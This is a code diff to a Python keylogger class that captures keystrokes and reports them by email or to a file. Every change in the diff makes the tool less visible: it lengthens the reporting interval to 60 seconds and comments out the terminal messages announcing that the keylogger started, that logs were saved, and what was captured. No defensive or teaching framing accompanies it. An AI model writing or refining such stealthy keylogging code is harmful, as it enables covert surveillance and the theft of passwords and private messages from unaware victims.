@@ -6,7 +6,7 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-SEND_REPORT_EVERY = 30 # Send keylogs every 30 seconds
+SEND_REPORT_EVERY = 60 # Send keylogs every 60 seconds
 
 class Keylogger:
 
@@ -68,7 +68,9 @@ class Keylogger:
 
             # write log to file
             print(self.log, file=new_file)
-        print(f"[+] Saved {self.filename}.txt")
+
+        # uncomment line below to have "SAVED" printed to terminal    
+        #print(f"[+] Saved {self.filename}.txt")
 
     def report(self):
 
@@ -82,7 +84,7 @@ class Keylogger:
             if self.report_method == "file":
                 self.report_to_file()
 
-            print(f"[{self.filename}] - {self.log}")
+            #print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         
         self.log = ""
@@ -106,7 +108,7 @@ class Keylogger:
         self.report()
 
         # simple message
-        print(f"{datetime.now()} - Started keylogger") # <--- take this out when done testing
+        #print(f"{datetime.now()} - Started keylogger")
 
         # block current thread, wait until CTRL + C pressed
         keyboard.wait()
